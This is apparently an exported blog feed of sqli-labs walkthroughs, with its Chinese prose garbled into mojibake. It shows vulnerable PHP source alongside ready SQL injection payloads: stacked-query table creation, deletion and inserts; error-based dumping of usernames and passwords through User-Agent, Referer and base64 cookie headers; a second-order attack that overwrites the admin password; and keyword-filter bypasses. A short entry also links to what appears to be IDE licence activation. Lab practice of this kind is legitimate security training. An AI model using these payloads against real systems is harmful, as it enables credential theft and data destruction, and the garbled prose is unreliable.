mysqli_store_result(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> = mysqli_fetch_row(<span class="variable">$result</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">            printf(<span class="string">&quot;Your Username is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            printf(<span class="string">&quot;Your Password is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">/* print divider */</span></span><br><span class="line">    <span class="keyword">if</span> (mysqli_more_results(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;-----------------\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//while (mysqli_next_result($con1));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysqli_error(<span class="variable">$con1</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* close connection */</span></span><br><span class="line">mysqli_close(<span class="variable">$con1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>mysqli_multi_query()</code>å †å æ³¨å…¥ï¼Œå¤šä¸ªæŸ¥è¯¢ç”¨<code>;</code>åˆ†éš”</p>
<p>å‚è€ƒ<code>https://www.cnblogs.com/lcamry/p/5762905.html</code></p>
<p><code>?id=1&#39;;create table test like users --+</code></p>
<p>å‘ç°æ•°æ®åº“ä¸­æ–°å»ºäº†åçš„<code>test</code>çš„è¡¨</p>
<p><code>?id=1&#39;;drop table test; --+</code>åˆ é™¤<code>test</code>è¡¨</p>
<p>åœ¨<code>uers</code>è¡¨æ·»åŠ æ•°æ®</p>
<p><code>?id=1&#39;;insert into users(id,username,password) values(&#39;25&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="39-å †å æ³¨å…¥"><a href="#39-å †å æ³¨å…¥" class="headerlink" title="39 å †å æ³¨å…¥"></a>39 å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ•°å­—å‹ ä¸éœ€è¦é—­åˆ</p>
<p><code>?id=1;insert into users(id,username,password) values(&#39;26&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;) --+</code></p>
<br>

<h3 id="40-å †å æ³¨å…¥"><a href="#40-å †å æ³¨å…¥" class="headerlink" title="40 å †å æ³¨å…¥"></a>40 å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>?id=1&#39;) ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="41-å †å æ³¨å…¥"><a href="#41-å †å æ³¨å…¥" class="headerlink" title="41 å †å æ³¨å…¥"></a>41 å †å æ³¨å…¥</h3><p><code>?id=2-1 --+</code>å’Œ<code>?id=1 --+</code>è¿”å›ç»“æœä¸€æ ·</p>
<p>å¯ä»¥åˆ¤æ–­æ˜¯æ•°å­—å‹ï¼Œå’Œ39ä¸€æ ·</p>
<p><code>?id=1 ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>ideaæ¿€æ´»</title>
    <url>/posts/b49b0221/</url>
    <content><![CDATA[<p><a href="https://shimo.im/docs/jRRw9RR3hhxPHpKg/read">https://shimo.im/docs/jRRw9RR3hhxPHpKg/read</a></p>
]]></content>
      <categories>
        <category>IDEA</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs2</title>
    <url>/posts/63ba4580/</url>
    <content><![CDATA[<h3 id="18-UAæ³¨å…¥"><a href="#18-UAæ³¨å…¥" class="headerlink" title="18 UAæ³¨å…¥"></a>18 UAæ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))       <span class="comment">// Quote if not a number</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p><code>check_input()</code>å‡½æ•°å…ˆæˆªå–å‰20ä½ï¼Œ</p>
<p>å¦‚æœå¼€å¯GPC,å»æ‰åæ–œæ ï¼Œ</p>
<p>å¦‚æœæ˜¯åè¿›åˆ¶ï¼Œæœ‰éæ³•å­—ç¬¦å†è½¬è¯‘æ‰</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">  $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">  $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">      if($row1)</span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">          $<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line">          mysql_query($<span class="keyword">insert</span>);</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">          echo <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          print_r(mysql_error());            </span><br><span class="line">          echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">          echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          </span><br><span class="line">          &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">          print_r(mysql_error());</span><br><span class="line">          ... ... </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯¹<code>username</code>å’Œ<code>password</code>åšäº†å¤„ç†ï¼Œä½†æ²¡æœ‰å¯¹<code>UA</code>å¤„ç† è¿™é‡Œä½¿ç”¨UAÂ·</p>
<p>burp suiteæŠ“åŒ…æ”¹UA <code>1&#39; or updatexml(1,concat(0x7e,(database()),0x7e),0) or &#39;</code></p>
<h3 id="19-Refereræ³¨å…¥"><a href="#19-Refereræ³¨å…¥" class="headerlink" title="19 Refereræ³¨å…¥"></a>19 Refereræ³¨å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uname <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">  $passwd <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">  $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">  $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">      if($row1)</span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">          $<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class="line">          mysql_query($<span class="keyword">insert</span>);</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">          echo <span class="string">&#x27;Your Referer is: &#x27;</span> .$uagent;</span><br></pre></td></tr></table></figure>

<p>æ”¹Referer <code>1&#39; or updatexml(1,concat(0x7e,(database()),0x7e),0) or &#39;</code></p>
<h3 id="20-Cookieæ³¨å…¥"><a href="#20-Cookieæ³¨å…¥" class="headerlink" title="20 Cookieæ³¨å…¥"></a>20 Cookieæ³¨å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uname <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">    $passwd <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">    $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">    $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">    $cookee <span class="operator">=</span> $row1[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        if($row1)</span><br><span class="line">            &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            setcookie(<span class="string">&#x27;uname&#x27;</span>, $cookee, <span class="type">time</span>()<span class="operator">+</span><span class="number">3600</span>);    </span><br><span class="line">            header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">            echo &quot;I LOVE YOU COOKIES&quot;;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Cookie is: &#x27;</span> .$cookee;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            print_r(mysql_error());            </span><br><span class="line">            echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">            echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">            print_r(mysql_error());</span><br></pre></td></tr></table></figure>

<p>æ”¹Cookie </p>
<p><code>uname=1.9&#39; and 1=1 union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1  #</code>æˆ–è€…</p>
<p><code>uname=1&#39; and updatexml(1,concat(0x7e,(select * from ( select concat(username,password) from users limit 0,1)a),0x7e),1)#</code></p>
<br>

<br>

<h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(<span class="operator">!</span>isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $cookee <span class="operator">=</span> $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">        $format <span class="operator">=</span> <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line">        $<span class="type">timestamp</span> <span class="operator">=</span> <span class="type">time</span>() <span class="operator">+</span> <span class="number">3600</span>;</span><br><span class="line">        ... ...</span><br><span class="line"></span><br><span class="line">        $cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">        $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=(&#x27;$cookee&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">        </span><br><span class="line">        ... ...</span><br></pre></td></tr></table></figure>

<p>å’Œ20å…³ç›¸æ¯”ï¼Œå¤šäº†base64ç¼–ç  ï¼Œè¿™ä¸ªä½¿ç”¨<code>&#39;)</code>é—­åˆ</p>
<p><code>uname=1&#39;) and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1)#</code> base64ä¸€ä¸‹</p>
<p><code>MScpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0ICogZnJvbSAoIHNlbGVjdCBjb25jYXRfd3MoJzonLHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHVzZXJzIGxpbWl0IDAsMSlhKSwweDdlKSwxKSM=</code></p>
<h3 id="22"><a href="#22" class="headerlink" title="22"></a>22</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(<span class="operator">!</span>isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $cookee <span class="operator">=</span> $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">            ... ... </span><br><span class="line">            $cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">            $cookee1 <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>. $cookee. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">            $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p><code>&quot;</code>é—­åˆï¼Œå…¶ä½™å’Œ21ç›¸åŒ</p>
<br>

<h3 id="23-è¢«è¿‡æ»¤-å•å¼•å·é—­åˆ-æŠ¥é”™æ³¨å…¥"><a href="#23-è¢«è¿‡æ»¤-å•å¼•å·é—­åˆ-æŠ¥é”™æ³¨å…¥" class="headerlink" title="23 #```-- è¢«è¿‡æ»¤ å•å¼•å·é—­åˆ æŠ¥é”™æ³¨å…¥"></a>23 <code>#```-- </code>è¢«è¿‡æ»¤ å•å¼•å·é—­åˆ æŠ¥é”™æ³¨å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>#</code>å’Œ<code>-- </code>è¢«è¿‡æ»¤äº† ä½¿ç”¨<code>&#39;</code>é—­åˆ</p>
<p><code>?id=1&#39; and &#39;1&#39;=&#39;1</code></p>
<p><code>?id=1&#39;%20 order by 5 and &#39;1&#39;=&#39;1</code>æ— æ³•é€šè¿‡è¿™ç§æ–¹å¼åˆ¤æ–­å­—æ®µæ•°</p>
<p><code>?id=-1&#39; union select 1,2 and &#39;1&#39;=&#39;1</code>æŠ¥é”™</p>
<p><code>?id=-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</code>ä¸æŠ¥é”™</p>
<p><code>?id=-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</code>æŠ¥é”™</p>
<p>å¯ä»¥åˆ¤æ–­æœ‰ä¸‰ä¸ªå­—æ®µï¼Œ2ï¼Œ3æ˜¯å›æ˜¾ç‚¹ï¼Œä½†æ˜¯3å¤„è¾“å‡ºç»“æœåªæœ‰0å’Œ1ï¼Œä¼°è®¡æ˜¯å¸ƒå°”å‹ï¼Œæ‰€ä»¥æŠŠ2å½“ä½œè¾“å‡ºç‚¹</p>
<p>å½“ç„¶è¿™é‡Œäº¦å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œç›¸å¯¹ç®€å•ç‚¹</p>
<p><code>?id=-1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code></p>
<br>

<br>

<h3 id="24-äºŒæ¬¡æ³¨å…¥"><a href="#24-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="24 äºŒæ¬¡æ³¨å…¥"></a>24 äºŒæ¬¡æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pass_change.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Validating the user input........</span></span><br><span class="line">    <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">        <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">        <span class="variable">$row</span> = mysql_affected_rows();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            header(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">            <span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Make sure New Password and Retype Password fields have same value&quot;</span>;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2, url=index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">    setcookie(<span class="string">&#x27;Auth&#x27;</span>, <span class="number">1</span> , time()<span class="number">-3600</span>);</span><br><span class="line">    header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨<code>update</code>åœ¨ä¿®æ”¹å¯†ç æ—¶ï¼Œ<code>$username</code>ç›´æ¥è·å–session å¹¶æ²¡æœ‰åšä»»ä½•è¿‡æ»¤å¤„ç†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#login.php</span></span><br><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">   <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   <span class="variable">$row</span> = mysql_fetch_row(<span class="variable">$res</span>);</span><br><span class="line">    <span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = sqllogin();</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$login</span>== <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line">    setcookie(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);  <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">    header(<span class="string">&#x27;Location: logged-in.php&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; ... ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å½“æˆåŠŸç™»å½•æ—¶ï¼Œ<code>$_SESSION[&quot;username&quot;]</code>ç›´æ¥å–å‡ºä½¿ç”¨ï¼Œå¹¶æ²¡æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™é‡Œçš„<code>$username</code>æ˜¯å¯æ§å˜é‡</p>
<br>

<br>

<p>å…ˆæ³¨å†Œä¸€ä¸ª<code>admin&#39;# </code>è´¦å· éšä¾¿è®¾ç½®ä¸€ä¸ªå¯†ç <code>123456</code>ï¼Œç™»å½•åä¿®æ”¹å¯†ç ä¸º<code>12345</code></p>
<p>ä½¿ç”¨<code>admin</code> å†æ¬¡ç™»å½•å‘ç°åŸå¯†ç <code>admin</code>è¢«æ”¹æˆ<code>12345</code></p>
<br>

<h3 id="25-or-andè¢«è¿‡æ»¤"><a href="#25-or-andè¢«è¿‡æ»¤" class="headerlink" title="25 or andè¢«è¿‡æ»¤"></a>25 <code>or</code> <code>and</code>è¢«è¿‡æ»¤</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®å›¾ç‰‡æç¤ºï¼Œ<code>or</code>å’Œ<code>and</code>è¢«è¿‡æ»¤äº†  ä½¿ç”¨<code>&#39;</code>é—­åˆ</p>
<p><code>?id=1&#39; --+</code></p>
<p><code>?id=1.99&#39; aandnd 1=1 union select 1,2,3%20 --+</code> 2,3ä¸ºè¾“å‡ºç‚¹</p>
<p>æˆ–è€… <code>?id=1.99&#39; aandnd 1=1 union select 1,2,3%20 anandd &#39;1&#39;=&#39;1</code></p>
<p>è™½ç„¶è¢«è¿‡æ»¤æ‰äº†ï¼Œä½†å¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡</p>
<br>

